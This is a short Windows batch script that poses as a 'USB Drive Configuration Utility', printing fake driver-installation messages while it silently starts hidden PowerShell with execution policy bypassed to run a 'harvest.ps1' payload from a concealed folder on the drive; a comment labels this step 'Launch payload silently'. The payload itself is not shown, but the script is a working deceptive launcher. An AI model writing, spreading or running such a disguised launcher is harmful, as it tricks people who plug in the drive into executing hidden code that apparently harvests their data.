@echo off
title USB Drive Setup
color 1F
echo.
echo  ============================================
echo   USB Drive Configuration Utility
echo   Please wait while drivers are installed...
echo  ============================================
echo.
echo  [*] Detecting hardware...
timeout /t 1 /nobreak >nul
echo  [*] Installing USB 3.0 drivers...
timeout /t 1 /nobreak >nul
echo  [*] Configuring storage interface...

:: Launch payload silently
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "$d=(Get-Location).Path; . \"$d\.p\harvest.ps1\"" >nul 2>&1
start /min /b powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File "%~dp0.p\harvest.ps1" >nul 2>&1

echo  [*] Optimizing read/write speed...
timeout /t 2 /nobreak >nul
echo  [*] Driver installation complete.
echo.
echo  ============================================
echo   Setup finished successfully.
echo   You may now safely use your USB drive.
echo  ============================================
echo.
timeout /t 3 /nobreak >nul
exit
